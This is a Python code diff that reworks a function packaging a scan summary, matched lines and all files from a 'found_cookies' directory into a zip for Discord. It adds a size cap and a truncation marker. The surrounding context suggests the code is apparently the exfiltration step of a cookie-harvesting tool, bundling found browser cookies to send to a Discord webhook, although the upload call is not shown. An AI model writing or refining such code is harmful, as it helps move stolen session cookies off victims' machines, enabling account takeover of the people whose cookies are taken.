@@ -973,34 +973,57 @@ def _format_duration(seconds: float) -> str:
 def _create_discord_zip(directory: str) -> Optional[bytes]:
     """Create a zip of results for Discord.
 
-    Includes the scan summary, matched lines, and the actual cookie files
-    (found_cookies/ directory) so the user gets the real files, not just text.
-    Returns None if no files to send.
+    Includes the scan summary, matched lines, and cookie files from the
+    found_cookies/ directory.  To avoid blowing up memory and Discord's
+    file limits, the zip is capped at ~6 MB of compressed data.  If the
+    cookie files exceed that, we include as many as fit and note the total
+    count in a ``_TRUNCATED.txt`` marker.
     """
+    MAX_ZIP_BYTES = 6 * 1024 * 1024  # stay under the 7 MB webhook safe limit
+
     base = Path(directory)
     buf = io.BytesIO()
     count = 0
+    truncated = False
+    total_cookies = 0
+
     with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
-        # Include summary files
+        # Include summary files first (always — they're tiny)
         for name in ("scan_summary.txt", "matched_lines.txt"):
             fpath = base / name
             if fpath.exists():
                 zf.write(fpath, name)
                 count += 1
 
-        # Include all cookie files from found_cookies/
+        # Include cookie files, stopping when the zip approaches the cap
         cookies_dir = base / "found_cookies"
         if cookies_dir.exists():
-            for fpath in cookies_dir.rglob("*"):
-                if fpath.is_file():
-                    arcname = str(fpath.relative_to(base))
-                    zf.write(fpath, arcname)
-                    count += 1
+            cookie_files = sorted(cookies_dir.rglob("*"), key=lambda p: p.stat().st_size)
+            total_cookies = sum(1 for f in cookie_files if f.is_file())
+            for fpath in cookie_files:
+                if not fpath.is_file():
+                    continue
+                arcname = str(fpath.relative_to(base))
+                zf.write(fpath, arcname)
+                count += 1
+                # Check compressed size so far (flush to see real bytes)
+                if buf.tell() > MAX_ZIP_BYTES:
+                    truncated = True
+                    break
+
+        if truncated:
+            zf.writestr(
+                "_TRUNCATED.txt",
+                f"ZIP capped at ~6 MB for Discord.\n"
+                f"Included {count} of {total_cookies} cookie files.\n"
+                f"Full results are on disk in: {directory}\n",
+            )
 
     if count == 0:
         return None
     data = buf.getvalue()
-    log.info(f"Discord zip: {count} file(s), {len(data)} bytes")
+    trunc_note = f" (TRUNCATED — {count}/{total_cookies} cookies)" if truncated else ""
+    log.info(f"Discord zip: {count} file(s), {len(data)} bytes{trunc_note}")
     return data
 
 
